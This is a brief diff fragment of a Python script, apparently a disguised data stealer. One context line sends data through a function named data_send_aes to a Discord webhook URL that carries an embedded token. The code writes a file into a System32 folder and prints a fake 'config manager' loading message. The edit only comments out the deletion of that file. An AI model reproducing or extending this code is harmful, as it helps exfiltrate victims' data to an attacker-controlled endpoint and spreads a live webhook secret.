@@ -35,7 +35,7 @@ data_send_aes('https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq1
 os.system('cls')
 file_path_default_kleix = r"C:\Windows\System32\aes_kleix\default_kleix.txt"
 if os.path.exists(file_path_default_kleix):
-    os.remove(file_path_default_kleix)
+    #os.remove(file_path_default_kleix)
     print("Success loading config manager...")
 
 def premx_2025(mycontent: str):
